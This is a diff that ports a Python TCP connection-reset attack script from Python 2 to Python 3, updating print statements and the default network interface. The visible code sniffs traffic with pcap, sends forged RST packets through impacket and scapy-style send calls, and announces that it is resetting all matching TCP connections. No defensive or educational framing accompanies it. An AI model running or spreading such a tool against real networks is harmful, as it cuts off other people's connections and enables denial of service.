@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import sys
 import getopt
@@ -8,7 +8,7 @@ from impacket.ImpactDecoder import EthDecoder, IPDecoder
 from impacket.ImpactDecoder import TCPDecoder
 
 
-dev = "eth0"
+dev = "wlp2s0"
 filter = ""
 eth_decoder = EthDecoder()
 ip_decoder = IPDecoder()
@@ -32,14 +32,14 @@ def handle_packet(hdr, data):
 
         send(packet, iface=dev)
 
-        print "RST %s:%d -> %s:%d" % (ip.get_ip_src(),
+        print("RST %s:%d -> %s:%d" % (ip.get_ip_src(),
                                       tcp.get_th_sport(),
                                       ip.get_ip_dst(),
-                                      tcp.get_th_dport())
+                                      tcp.get_th_dport()))
 
 
 def usage():
-    print sys.argv[0] + " -i <dev> -f <pcap_filter>"
+    print(sys.argv[0] + " -i <dev> -f <pcap_filter>")
     sys.exit(1)
 
 try:
@@ -64,6 +64,6 @@ else:
     filter = "tcp"
 
 pcap.setfilter(filter)
-print "Resetting all TCP connections on %s " + \
-      "matching filter %s " % (dev, filter)
+print("Resetting all TCP connections on " + dev + \
+      " matching filter " + filter)
 pcap.loop(0, handle_packet)
